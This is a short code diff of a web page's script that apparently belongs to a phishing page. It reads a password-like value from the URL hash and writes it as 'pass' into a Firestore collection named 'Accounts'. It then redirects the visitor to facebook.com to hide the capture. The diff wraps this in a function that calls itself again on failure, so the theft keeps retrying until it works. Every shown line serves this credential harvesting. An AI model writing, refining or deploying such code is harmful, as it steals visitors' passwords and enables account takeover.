@@ -59,17 +59,23 @@
                 appId: "1:702145349166:web:5ca10176bf764ad6cd41bf",
                 measurementId: "G-NRS398L5KQ"
               };
-              
-                // Initialize Firebase
-                firebase.initializeApp(firebaseConfig);
-                // Initialize Cloud Firestore and get a reference to the service
-                const db = firebase.firestore();
-
-                var hash = location.hash
-                var passt = hash.replace("#", "")
-                BotBtn = db.collection("Accounts").doc(Date())
-                BotBtn.set({
-                    pass : passt
-                })
-                window.location.href = "https://facebook.com"
+              function save(){
+                  try{
+                  // Initialize Firebase
+                  firebase.initializeApp(firebaseConfig);
+                  // Initialize Cloud Firestore and get a reference to the service
+                  const db = firebase.firestore();
+  
+                  var hash = location.hash
+                  var passt = hash.replace("#", "")
+                  BotBtn = db.collection("Accounts").doc(Date())
+                  BotBtn.set({
+                      pass : passt
+                  })
+                  window.location.href = "https://facebook.com"
+                  }catch{
+                    save()
+                  }
+              }
+              save()
             })
